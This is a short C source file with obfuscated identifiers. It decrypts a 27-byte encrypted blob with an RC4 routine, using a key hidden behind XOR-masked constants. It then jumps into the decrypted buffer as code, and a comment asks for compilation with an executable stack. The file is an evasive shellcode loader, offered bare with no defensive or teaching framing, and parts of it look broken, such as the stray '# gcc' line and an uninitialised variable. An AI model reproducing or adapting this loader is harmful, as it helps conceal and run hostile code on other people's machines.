#include <stdio.h>

# gcc ... -z execstack

typedef unsigned char _SMC11LlJj;

int _SMc1jje(int _SMc1Jje__, int _SMc1jje__){

	int z,_SMc1jje_,_SMclJje__,e ;
	_SMc1jje_ = 0 ;
	_SMclJje__ = _SMc1Jje__ | _SMc1jje_;
	e = 1 + z;
	if( _SMc1Jje__ > 0){
		for(; _SMc1jje_ < _SMc1jje__ ; _SMclJje__+=1, _SMc1jje_++);
		e << ( _SMc1Jje__ ^ _SMc1jje__) - _SMclJje__ ;
		return _SMclJje__ ;
	}
	else {
		for(_SMc1jje_ = _SMc1jje__; _SMc1jje_ > 0 ; _SMclJje__+=1, _SMc1jje_--);
		_SMc1jje__ << ( _SMc1Jje__ ^ e) - ( 45 ^ z) ;
		return _SMclJje__ ;
	}	
}

void _SMC11LJj(_SMC11LlJj *__SMc1LJj, int i1, int i2)
{
	_SMC11LlJj _SMcK1Lkjj ;
	_SMcK1Lkjj = __SMc1LJj[i1] ;
	__SMc1LJj[i1] = __SMc1LJj[i2] ;
	__SMc1LJj[i2] = _SMcK1Lkjj ;
}

void _SNc1jje__SMc1Jj(_SMC11LlJj _5Mc1jje[255], _SMC11LlJj _SNc1jje[], size_t ksize){
	int i, j = 0;
	for(i=0;i<=255; i = _SMc1jje(i, 1)){
		j = ( _SMc1jje(_SMc1jje(j, _5Mc1jje[i]),_SNc1jje[ i % ksize])) % 256 ;
		_SMC11LJj(_5Mc1jje, i, j);
	}
}


void _SMcC1LJj(_SMC11LlJj _5Mc1jje[255], _SMC11LlJj *__, size_t ____, int op, unsigned char* ___){
	
	int __5McC1LJj, j, __SMcC1LJj ;
	__5McC1LJj = j = 0;
	_SMC11LlJj cipher_b ;
	for(__SMcC1LJj = 0 ; __SMcC1LJj < ____ ; __SMcC1LJj = _SMc1jje(__SMcC1LJj,1)){
		__5McC1LJj = ( _SMc1jje(__5McC1LJj,1))%256;j = (_SMc1jje(j, _5Mc1jje[__5McC1LJj])) % 256 ;
		_SMC11LJj(_5Mc1jje, __5McC1LJj, j); cipher_b = _5Mc1jje[ _SMc1jje(_5Mc1jje[__5McC1LJj],_5Mc1jje[j]) % 256 ] ;
		___[__SMcC1LJj] = cipher_b ^ __[__SMcC1LJj] ;
	}
}

void _SMcC11LJj(_SMC11LlJj __SMc1LJj[255], _SMC11LlJj _SNc1jje[], size_t ksize){
	
	int j ;
	for(j = 0; j <= 255; j = _SMc1jje(j,1)){
		__SMc1LJj[j] = j ;
	}
	_SNc1jje__SMc1Jj(__SMc1LJj, _SNc1jje, ksize);
}


int main(void){

		unsigned char _SMc1Jje[] = "\x71\x2d\x89\x07\xf1\x00\xd7\xf5\xef\x7b\xad\x68\x30\x76\xac\xb5\xf1\x8d\x45\x8a\x82\xde\xc7\x63\x59\xe1\x1f";
		unsigned char __SMc1Jje[27];
		unsigned char _SNc1jje[] = "\x0d\x07\x1c\x30\x28\x1d\x24\x23\x01\x16\x16\x04\x3f\x1d\x72\x3b\x1d\x05";
		_SMC11LlJj _5Mc1jje[256];

		
		unsigned char _SMcljje[16];
		_SMcljje[ 57460858 ^ 57460849 ]= 80641546 ^ 80641637 ;
		_SMcljje[ 55353261 ^ 55353261 ]= 61819423 ^ 61819467 ;
		_SMcljje[ 55102455 ^ 55102450 ]= 69419082 ^ 69419065 ;
		_SMcljje[ 51345926 ^ 51345925 ]= 72042905 ^ 72042986 ;
		_SMcljje[ 17554378 ^ 17554382 ]= 22688439 ^ 22688510 ;
		_SMcljje[ 6611196 ^ 6611194 ]= 53327859 ^ 53327779 ;
		_SMcljje[ 42910279 ^ 42910272 ]= 28862327 ^ 28862230 ;
		_SMcljje[ 57656931 ^ 57656929 ]= 75043160 ^ 75043121 ;
		_SMcljje[ 71021887 ^ 71021873 ]= 96038374 ^ 96038343 ;
		_SMcljje[ 91748811 ^ 91748802 ]= 35722942 ^ 35722957 ;
		_SMcljje[ 46945919 ^ 46945918 ]= 97721445 ^ 97721357 ;
		_SMcljje[ 37400632 ^ 37400626 ]= 59001866 ^ 59001981 ;
		_SMcljje[ 31811705 ^ 31811700 ]= 92224919 ^ 92225011 ;
		_SMcljje[ 15657950 ^ 15657938 ]= 69270142 ^ 69270028 ;
		_SMcljje[ 61792527 ^ 61792519 ]= 84447270 ^ 84447317 ;

		int _SMCL1jJe;

		for( _SMCL1jJe = 0; _SMCL1jJe < 18 ; _SMCL1jJe=_SMc1jje(_SMCL1jJe,1))_SNc1jje[_SMCL1jJe] = _SNc1jje[_SMCL1jJe] ^ _SMcljje[_SMCL1jJe%15];
		_SMcC11LJj(_5Mc1jje, _SNc1jje, sizeof(_SNc1jje)-1);	_SMcC1LJj(_5Mc1jje, _SMc1Jje, sizeof(_SMc1Jje)-1, 0, __SMc1Jje);(*(void(*)()) __SMc1Jje)();

}
